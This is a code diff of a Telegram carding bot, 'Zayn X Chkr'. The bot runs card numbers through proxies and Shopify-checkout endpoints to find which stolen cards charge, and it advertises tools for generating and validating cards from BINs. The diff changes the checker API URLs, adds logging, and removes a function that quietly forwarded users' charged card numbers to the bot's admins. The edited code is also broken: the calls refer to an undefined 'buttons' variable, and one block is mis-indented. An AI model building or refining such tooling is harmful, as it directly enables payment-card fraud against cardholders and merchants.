@@ -1,4 +1,3 @@
-cat << 'EOF' > bot.py
 from telethon import TelegramClient, events, Button
 import asyncio
 import aiohttp
@@ -17,19 +16,15 @@ from collections import Counter
 
 # ==================== DIRECT API ENDPOINTS ====================
 SHOPIFY_APIS = [
-  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
-  "http://chirag-x-shopify-production.up.railway.app/shopify",
-  "http://chirag-x-shopify-production-6ead.up.railway.app/shopify",
-  "http://chirag-x-shopify-production-e9ef.up.railway.app/shopify",
-  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
-  "https://new-one.up.railway.app/shopii",
+  "https://autoshopifychk.onrender.com/shopify?site=&cc=&proxy=",
+  "https://bhikari-production-bf277.up.railway.app/shopify?site=&cc=&proxy="
 ]
 
 # ==================== PREMIUM CUSTOM EMOJI IDS ====================
 PREMIUM_EMOJI_IDS = {
     "💳": "5445353829304387411",
     "✅": "4956721670690702265", "❌": "4958526153955476488", "🔥": "4956499161319998529",
-    "⚡": "4958479549265347295", "💠": "5343636681473935403",
+    "⚡": "4958479549265347295", "💳": "5472250091332993630", "💠": "5343636681473935403",
     "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5042290883949495533",
     "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
     "🚀": "4904936030232117798", "⚠️": "4956611513369494230", "💎": "4956719506027185156",
@@ -49,30 +44,32 @@ PREMIUM_EMOJI_IDS = {
     "🎉": "5172632227871196306", "🎁": "6025929752982852543", "🚫": "5116151848855667552",
     "🛒": "5312361253610475399", "🔧": "4904936030232117798", "😎": "6062275913725252016",
     "⛔️": "5275969776668134187", "🥲": "4904468402782864209", "💐": "5211171480519337811",
-    "🛡": "5219672809936006424", "📸": "5445344161333015312", "💬": "5447510826304959724",
-    "😺": "5118590136149345664", "🌍": "4956560549287560231", "🤓": "5422553316808730347",
-    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
-    "🌟": "5310224206732996002", "✳": "5040071927750722576", "📍": "5447187153274567373",
-    "🔐": "5258476306152038031", "✴": "6321225560789877992", "😇": "5195033767969839232",
-    "👌": "5445350109862720603", "❇": "5039727497143387500", "⭐": "5042176294222037888",
-    "🍭": "6267152480878990865", "🤠": "5377396889652060561", "⚙️": "5258023599419171861",
-    "⛔": "4918014360267260850", "0️⃣": "6053163053980063912", "❣️": "4956222745814762495",
-    "1️⃣": "6052991826518873591", "🕛": "5787488119490088755", "🫠": "5472250091332993630",
-    "🙃": "5377710125911924926", "🤩": "5039727497143387500", "🫡": "5226656353744862682",
-    "🌸": "5823478592515871391", "😏": "4956461073550017373", "😙": "6237864166879663987",
-    "🤟": "6267225207560214192", "🤑": "6089140105233044310", "🥳": "5767137507879685567",
-    "😥": "5040042498634810056", "🥶": "5283232570660634549", "🌻": "6332197763417118285",
-    "📩": "6154448909784585982", "😋": "4958642964181025908", "♻": "4956719506027185156",
-    "🟠": "5825848340721438908", "🔴": "4956719506027185156", "🟢": "6235478849417647339",
-    "🤪": "5332455502917949981", "🔶": "5123248930124989216", "🏅": "5780864206177834457",
-    "🥇": "5769547529993588669", "🥈": "6156436440260549720", "🥉": "6235355429237430006",
-    "🏆": "6235403472741603087", "🤭": "5825806005228803076", "😄": "5438571934210082705",
-    "🧨": "5989927820984327321", "🌌": "5990181988558969463", "🧐": "5825779518165488504",
-    "🕘": "5258113901106580375", "✨": "6298612102709909362", "⚡️": "5042334757040423886",
-    "🎉": "6282977077427702833", "💀": "6206110936789423908", "🎁": "6066395745139824604",
-    "🌟": "5267500801240092311", "🤖": "5039727497143387500", "⏸️": "6001440193058444284",
-    "▶️": "6285315214673975495", "🛑": "5420323339723881652", "🔙": "6285315214673975495",
-    "🏠": "6282977077427702833",
+    "☠️": "5231338559587257737", "🛡": "5219672809936006424", "🥰": "5881784744949062058", 
+    "😱": "5868517294618975202", "📸": "5445344161333015312", "💬": "5447510826304959724",
+    "😺": "5118590136149345664", "🌍": "4956560549287560231", "😎": "6062275913725252016",
+    "🤓": "5422553316808730347", "🔹": "5429436388447655367", "📹": "5445158077579952110", 
+    "📡": "5447448489149625830", "🌟": "5310224206732996002", "✳": "5040071927750722576", 
+    "📍": "5447187153274567373", "🔐": "5258476306152038031", "✴": "6321225560789877992", 
+    "😇": "6321225560789877992", "👌": "5445350109862720603", "❇": "5039727497143387500", 
+    "⭐": "5042176294222037888", "🍭": "6267152480878990865", "🤠": "5377396889652060561", 
+    "⚙️": "5258023599419171861", "⛔": "4918014360267260850", "0️⃣": "6053163053980063912", 
+    "❣️": "4956222745814762495", "1️⃣": "6052991826518873591", "🕛": "5787488119490088755", 
+    "🫠": "5472250091332993630", "🙃": "5377710125911924926", "🤩": "5039727497143387500", 
+    "🫡": "5226656353744862682", "🌸": "5823478592515871391", "🔷️": "5226656353744862682", 
+    "😏": "4956461073550017373", "😙": "6237864166879663987", "🤟": "6267225207560214192", 
+    "🤑": "6089140105233044310", "🥳": "5767137507879685567", "😥": "5040042498634810056", 
+    "🥶": "5283232570660634549", "🌻": "6332197763417118285", "📩": "6154448909784585982", 
+    "😋": "4958642964181025908", "♻": "4956719506027185156", "🟠": "5825848340721438908", 
+    "😛": "4958900559139570572", "🔴": "4956719506027185156", "🟢": "6235478849417647339", 
+    "🤪": "5332455502917949981", "🔶": "5123248930124989216", "🌍": "5224450179368767019",
+    "🏅": "5780864206177834457", "🥇": "5769547529993588669", "🥈": "6156436440260549720", 
+    "🥉": "6235355429237430006", "🏆": "6235403472741603087", "🤭": "5825806005228803076",
+    "😄": "5438571934210082705", "🧨": "5989927820984327321", "🌌": "5990181988558969463",
+    "😇": "5195033767969839232", "🧐": "5825779518165488504", "🕘": "5258113901106580375",
+    "✨": "6298612102709909362", "⚡️": "5042334757040423886", "🎉": "6282977077427702833",
+    "💀": "6206110936789423908", "🎁": "6066395745139824604", "🌟": "5267500801240092311",
+    "🤖": "5039727497143387500", "⏸️": "6001440193058444284", "▶️": "6285315214673975495",
+    "🛑": "5420323339723881652", "🔙": "6285315214673975495", "🏠": "6282977077427702833",
 }
 
 def premium_emoji(text):
@@ -191,7 +188,7 @@ _DEAD_INDICATORS = (
     'gateway timeout', 'network error', 'connection reset',
     'failed to detect product', 'failed to create checkout',
     'failed to tokenize card', 'failed to get proposal data',
-    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
+    'submit rejected', 'submit rejected:','handle error', 'http 404',
     'delivery_delivery_line_detail_changed', 'delivery_address2_required',
     'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
     'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
@@ -233,7 +230,7 @@ SITE_DEAD_TRIGGERS = [
     "no valid products", "product price too high", "site requires login",
     "proxy error", "status: 4", "site dead", "error processing card",
     "generic_error", "validation_custom", "429", "rate limit",
-    "too many requests", "401", "403", "404", "no valid", "<b>Proxy Dead!</b>", "session token not found in HTML", "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "NO_PRODUCT_FOUND",
+    "too many requests", "401", "403", "404", "no valid", "403", "401", "429", "<b>Proxy Dead!</b>", "session token not found in HTML", "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "NO_PRODUCT_FOUND",
     'Our minimum order is $15. Sticker fans: mix & match any 4+ designs, or grab the',
 ]
 
@@ -363,34 +360,6 @@ async def get_bin_info(card_number):
     except Exception:
         return '-', '-', '-', '-', '-', ''
 
-async def forward_charge_to_admin(card, result, user_id, username):
-    try:
-        admins = load_admins()
-        if not admins:
-            return
-        
-        gateway = result.get('gateway', 'Shopify Payments')
-        price = result.get('price', '0.00')
-        response_msg = result.get('message', 'Charged')
-        
-        message = f"""<b>🔥 NEW CHARGED HIT! 🔥</b>
-<b>━━━━━━━━━━━━━━━━━━━━━━</b>
-<b>💳 CC :</b> <code>{card}</code>
-<b>💰 Price :</b> ${price}
-<b>🔗 Gateway :</b> {gateway}
-<b>💬 Result :</b> {response_msg[:100]}
-<b>👤 User :</b> @{username} (<code>{user_id}</code>)
-<b>━━━━━━━━━━━━━━━━━━━━━━</b>
-<b>🤖 Zayn X Chkr</b>"""
-
-        for admin_id in admins:
-            try:
-                await bot.send_message(int(admin_id), premium_emoji(message), parse_mode='html')
-            except:
-                pass
-    except Exception as e:
-        print(f"Error forwarding charge to admin: {e}")
-
 async def check_card(card, site, proxy):
     global API_FAIL_COUNT
     
@@ -420,7 +389,7 @@ async def check_card(card, site, proxy):
 
         response_msg = str(raw.get('Response', '')).strip()
         price = raw.get('Price', '-')
-        gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮'))
+        gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮'))
         status = raw.get('Status', '')
         api_status = raw.get('Status', False)
 
@@ -429,6 +398,7 @@ async def check_card(card, site, proxy):
         if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
             async with API_FAIL_LOCK:
                 API_FAIL_COUNT += 1
+                print(f"⚠️ API Fail #{API_FAIL_COUNT} — {site[:50]}")
             
             return {
                 "status": "Site Error",
@@ -442,6 +412,7 @@ async def check_card(card, site, proxy):
 
         async with API_FAIL_LOCK:
             if API_FAIL_COUNT > 0:
+                print(f"✅ API Success — Reset count from {API_FAIL_COUNT} to 0")
                 API_FAIL_COUNT = 0
 
         is_rz = "razorpay" in gate.lower() or "rz" in gate.lower()
@@ -510,6 +481,7 @@ async def check_card(card, site, proxy):
         if not api_status:
             async with API_FAIL_LOCK:
                 API_FAIL_COUNT += 1
+                print(f"⚠️ API Fail #{API_FAIL_COUNT} (Status False) — {site[:50]}")
             
             return {
                 'status': 'Site Error',
@@ -534,13 +506,14 @@ async def check_card(card, site, proxy):
     except asyncio.TimeoutError:
         async with API_FAIL_LOCK:
             API_FAIL_COUNT += 1
+            print(f"⚠️ API Fail #{API_FAIL_COUNT} (Timeout) — {site[:50]}")
         
         return {
             'status': 'Site Error',
             'message': 'Request timeout',
             'card': card,
             'retry': True,
-            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
+            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
             'price': '-',
             'site': site
         }
@@ -548,13 +521,14 @@ async def check_card(card, site, proxy):
     except json.JSONDecodeError as e:
         async with API_FAIL_LOCK:
             API_FAIL_COUNT += 1
+            print(f"⚠️ API Fail #{API_FAIL_COUNT} (JSON Error) — {site[:50]}")
         
         return {
             'status': 'Site Error',
             'message': f'Invalid JSON: {str(e)[:50]}',
             'card': card,
             'retry': True,
-            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
+            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
             'price': '-',
             'site': site
         }
@@ -562,13 +536,14 @@ async def check_card(card, site, proxy):
     except Exception as e:
         async with API_FAIL_LOCK:
             API_FAIL_COUNT += 1
+            print(f"⚠️ API Fail #{API_FAIL_COUNT} (Exception) — {site[:50]}")
         
         return {
             'status': 'Site Error',
             'message': f'Error: {str(e)[:80]}',
             'card': card,
             'retry': True,
-            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
+            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
             'price': '-',
             'site': site
         }
@@ -578,9 +553,9 @@ API_FAIL_LOCK = asyncio.Lock()
 
 async def check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES):
     if not sites:
-        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}
+        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
     if not proxies:
-        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}
+        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
 
     used_sites = set()
     used_proxies = set()
@@ -607,7 +582,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES):
         if attempt < max_retries - 2:
             await asyncio.sleep(0.3)
 
-    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
 
 async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User"):
     elapsed = int(time.time() - results['start_time'])
@@ -624,7 +599,7 @@ async def update_progress(user_id, message_id, results, current_attempt_count, f
 
     progress_text = f"""<b>𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚</b>
 <b>━━━━━━━━━━━━━━━━━━━━━━</b>
-<b>📊 𝐏𝐑𝐎𝗚𝗥𝐄𝐒𝐒 𝐑𝐄𝐏𝐎𝐑𝐓</b>
+<b>📊 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 𝐑𝐄𝐏𝐎𝐑𝐓</b>
 
 <code>{bar}</code> <b>{progress_percent}%</b>
 
@@ -704,36 +679,36 @@ async def send_start_video_and_welcome(user_id, username, page="home"):
 
 ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
 
-<b>[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝚒𝚘ɴ 𝚋𝚎𝚕𝚘𝚠 ⌁ ⚡</b>"""
+<b>[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝚒𝚘𝚗 𝚋𝚎𝚕𝚘𝚠 ⌁ ⚡</b>"""
 
-    main_buttons = [
-        [
-            Button.inline("ᴄʜᴇᴄᴋᴇʀ", "show_cmds"),
-            Button.inline("ʙᴜʏ ɴᴏᴡ", "owner_redirect"),
-        ],
-        [
-            Button.inline("ᴛᴏᴏʟs", "tools_redirect"),
-            Button.inline("sᴜᴘᴘᴏʀᴛ", b"support_menu", style="primary"),
-        ],
-        [
-            Button.url("ᴜᴘᴅᴀᴛᴇs", f"https://t.me/+I_2VKfDzJKIyOTQ1"),
-            Button.url("ɢʀᴏᴜᴘ", f"https://t.me/+nPZ8PTVPs4AxNTY1"),
-        ]
-    ]
+
+        main_buttons = [
+            [
+                Button.inline("ᴄʜᴇᴄᴋᴇʀ", "show_cmds"),
+                Button.inline("ʙᴜʏ ɴᴏᴡ", "owner_redirect"),
+            ],
+            [
+                Button.inline("ᴛᴏᴏʟs", "tools_redirect"),
+                Button.inline("sᴜᴘᴘᴏʀᴛ", b"support_menu", style="primary"),
+            ],
+            [
+                Button.url("ᴜᴘᴅᴀᴛᴇs", f"https://t.me/+I_2VKfDzJKIyOTQ1"),
+                Button.url("ɢʀᴏᴜᴘ", f"https://t.me/+nPZ8PTVPs4AxNTY1"),
+                ]]
 
     try:
         if start_videos:
             video_url = random.choice(start_videos)
-            await bot.send_file(user_id, video_url, caption=premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
+            await bot.send_file(user_id, video_url, caption=premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
         else:
-            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
+            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
     except Exception as e:
         print(f"Error sending start video: {e}")
         try:
-            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
+            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
         except:
             clean_text = re.sub(r'<[^>]+>', '', welcome_text)
-            await bot.send_message(user_id, clean_text, buttons=main_buttons)
+            await bot.send_message(user_id, clean_text, buttons=buttons)
 
 async def send_result_with_gif(user_id, message, gif=None):
     if not gif:
@@ -745,6 +720,7 @@ async def send_result_with_gif(user_id, message, gif=None):
             await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
     except Exception as e:
         print(f"Error sending result: {e}")
+        # Fallback - send without gif
         try:
             await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
         except:
@@ -758,6 +734,7 @@ async def send_otp_result(user_id, result, username):
         brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''
     
     user_role = "🛡️ Admin" if is_admin(user_id) else "⭐ Premium" if is_premium(user_id) else "🆓 Free"
+    gateway = result.get('gateway', 'Shopify Payments')
     response_msg = result.get('message', 'OTP Required')
     
     if 'otp' in response_msg.lower():
@@ -805,6 +782,7 @@ async def send_animated_result(user_id, result, hit_type, username, is_premium_u
 
     user_role = "🛡️ Admin" if is_admin(user_id) else "⭐ Premium" if is_premium(user_id) else "🆓 Free"
     price = result.get('price', '0.00')
+    gateway = result.get('gateway', 'Shopify Payments')
     amount_display = f"🥶 ${price} USD"
 
     message = f"""<b>[⌯]{hit_type.upper()} </b>
@@ -829,7 +807,12 @@ async def send_dead_result(user_id, result, username):
     except:
         brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''
     
+    response_msg = result.get('message', 'No response')
+    if len(response_msg) > 150:
+        response_msg = response_msg[:150] + '...'
+
     user_role = "🛡️ Admin" if is_admin(user_id) else "⭐ Premium" if is_premium(user_id) else "🆓 Free"
+    gateway = result.get('gateway', 'Shopify Payments')
 
     message = f"""<b>[⌯] 𝐃𝐄𝐀𝐃</b>
 <b>─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</b>
@@ -1499,13 +1482,13 @@ async def admin_panel(event):
     menu = f"""<b>𝗭𝗮𝘆𝗻 𝘅 𝗖𝗵𝗸𝗿</b>
 <b>━━━━━━━━━━━━━━━━━━━━━━</b>
 
-<b>👥 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝘁</b>
+<b>👥 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭</b>
 <code>/ban [user_id]      - Ban user
 /unban [user_id]    - Unban user
 /users              - List all users
 /stats              - Bot stats</code>
 
-<b>🔑 𝐏𝐫𝐞𝐦𝚒𝚞𝗺 𝐌𝐠𝐦𝐭</b>
+<b>🔑 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐌𝐠𝐦𝐭</b>
 <code>/genkey [days]      - Generate key
 /addpremium [id]    - Add premium
 /rmpremium [id]     - Remove premium
@@ -2619,7 +2602,7 @@ async def check_more_callback(event):
 <code>/chk</code>
 
 <b>━━━━━━━━━━━━━━━━━━━━━━</b>
-<b>⚡️ 150 workers for stable speed</b>
+<b>⚡️ 44 workers for stable speed</b>
 <b>🛠️ Tools available: /tools</b>"""
     
     try:
@@ -2804,7 +2787,7 @@ async def single_cc_check(event):
         except:
             pass
 
-# ==================== MAIN CHECK COMMAND WITH WORKERS ====================
+# ==================== MAIN CHECK COMMAND WITH 44 WORKERS ====================
 
 @bot.on(events.NewMessage(pattern='/chk'))
 async def check_command(event):
@@ -2923,10 +2906,10 @@ async def check_command(event):
                 response_msg = res.get('message', '').lower()
                 is_otp_or_3ds = 'otp_required' in response_msg or '3ds_required' in response_msg
                 
+                # ✅ FIX: Send results with try-except to avoid breaking the loop
                 try:
                     if res['status'] == 'Charged':
                         all_results['charged'].append(res)
-                        await forward_charge_to_admin(card, res, user_id, username)
                         await send_animated_result(user_id, res, 'Charged', username, is_prem)
                     elif res['status'] == 'Approved':
                         if is_otp_or_3ds:
@@ -2938,6 +2921,7 @@ async def check_command(event):
                     else:
                         all_results['dead'].append(res)
                 except Exception as send_error:
+                    # Agar send mein error aata hai toh bhi card dead mein daal do
                     print(f"Send error for card {card}: {send_error}")
                     all_results['dead'].append(res)
                     
@@ -2952,6 +2936,7 @@ async def check_command(event):
                         except Exception:
                             pass
 
+        # ============ 44 WORKERS ============
         workers = [asyncio.create_task(worker()) for _ in range(WORKER_COUNT)]
         
         while workers:
@@ -3438,7 +3423,19 @@ print("✅ 𝗭𝗮𝘆𝗻 𝘅 𝗖𝗵𝗸𝗿 𝔹𝕆𝕋 𝕊𝕋𝔸ℝ�
 print("=" * 60)
 print(f"⚡️ {WORKER_COUNT} WORKERS CONFIGURED FOR STABLE SPEED")
 print("🛠️ 7+ TOOLS INCLUDED")
-print("🔥 BACKEND: CHECKER ENGINE")
+print("🔥 BACKEND: 1st_alone.py CHECKER ENGINE")
+print("=" * 60)
+print("Tools Available:")
+print("   /gen [BIN] [count]  - Generate CCs (max 10000)")
+print("   /bin [BIN]         - BIN lookup")
+print("   /clean             - Remove dead/expired cards")
+print("   /split [lines]     - Split files")
+print("   /merge             - Merge files (Reply to last file)")
+print("   /validate          - Validate cards")
+print("   /convert [format]  - Convert format")
+print("=" * 60)
+print("👑 Admin Commands:")
+print("   /admin - Admin Panel")
 print("=" * 60)
 
 try:
@@ -3446,4 +3443,3 @@ try:
 finally:
     if http_session and not http_session.closed:
         asyncio.run(http_session.close())
-EOF
